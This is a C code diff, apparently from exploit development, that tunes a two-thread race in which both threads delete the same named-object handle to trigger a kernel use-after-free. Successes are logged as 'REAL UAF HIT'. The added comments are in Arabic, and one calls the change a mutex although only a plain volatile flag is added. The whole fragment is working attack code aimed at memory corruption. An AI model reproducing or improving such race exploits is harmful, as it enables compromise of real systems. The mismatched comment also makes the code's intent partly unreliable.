@@ -20,27 +20,35 @@ static volatile int g_running =  1;
 static volatile int g_hits    =  0;
 static volatile int g_count   =  0;
 
+// إضافة mutex لضبط الترتيب:
+static volatile int g_deleted = 0;
+
 void* thread_delete_a(void* arg) {
-    printf_debug("thread_A start\n");
     while (g_running) {
         int h = g_handle;
         if (h == -1) continue;
-        g_handle = -1;
-        namedobj_delete(h, NAMEDOBJ_FLAGS);
+        g_handle  = -1;
+        g_deleted = 0;
+        namedobj_delete(h, NAMEDOBJ_FLAGS);  // A يحذف أولاً
+        g_deleted = 1;                        // أبلغ B
     }
     return NULL;
 }
 
 void* thread_delete_b(void* arg) {
-    printf_debug("thread_B start\n");
     while (g_running) {
         int h = g_handle;
         if (h == -1) continue;
+        // انتظر حتى A يبدأ الحذف
+        while (g_deleted == 0 && g_handle == -1 && g_running);
+        // الآن حاول في نفس اللحظة
         int r = namedobj_delete(h, NAMEDOBJ_FLAGS);
         if (r == 0) {
             g_hits++;
-            printf_debug("[!!!] UAF HIT #%d h=0x%x\n", g_hits, h);
+            printf_debug("[!!!] REAL UAF HIT #%d h=0x%x\n",
+                         g_hits, h);
         }
+        g_deleted = 0;
     }
     return NULL;
 }
